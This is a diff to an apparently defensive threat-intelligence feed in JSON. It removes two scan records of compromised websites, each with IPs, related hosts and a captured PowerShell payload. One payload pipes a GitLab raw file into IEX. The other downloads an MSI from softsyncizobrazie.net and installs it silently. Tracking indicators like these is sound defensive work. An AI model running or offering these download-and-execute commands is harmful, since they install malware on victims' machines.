@@ -1566,44 +1566,5 @@
     ],
     "ReportId": "cmwdyzawy06vv0omlgusub5ga",
     "ScannedAt": "2026-11-12T19:57:38.952000+00:00"
-  },
-  {
-    "UrlDomain": "floripaprimetravel.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "192.185.208.37"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/amber-ffa-f15a6b/b788-40ef-9a42-abc325898912/-/raw/main/9fd-a6c523a5e801 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/amber-ffa-f15a6b/b788-40ef-9a42-abc325898912/-/raw/main/9fd-a6c523a5e801"
-    ],
-    "ReportId": "cmwdxprc105rj0omlyy2rxdia",
-    "ScannedAt": "2026-11-12T19:22:14.096000+00:00"
-  },
-  {
-    "UrlDomain": "newwaymedia.de",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "81.169.145.175"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwdxp8ne05qu0omlyd8d0l2n",
-    "ScannedAt": "2026-11-12T19:21:49.887000+00:00"
   }
 ]
